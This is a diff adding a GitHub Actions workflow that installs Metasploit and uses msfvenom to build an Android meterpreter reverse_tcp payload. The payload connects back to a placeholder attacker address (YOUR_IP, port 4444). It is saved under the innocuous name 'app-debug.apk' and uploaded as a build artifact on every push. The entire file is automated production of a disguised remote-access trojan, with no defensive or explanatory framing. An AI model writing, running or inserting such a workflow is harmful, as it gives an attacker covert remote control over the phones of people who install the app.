@@ -1,0 +1,29 @@
+name: Build MSF APK
+
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+
+    - name: Install Metasploit
+      run: |
+        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+        chmod 755 msfinstall
+        sudo ./msfinstall
+
+    - name: Generate APK with msfvenom
+      run: |
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o app-debug.apk
+
+    - name: Upload APK
+      uses: actions/upload-artifact@v4
+      with:
+        name: MSF-APK
+        path: app-debug.apk
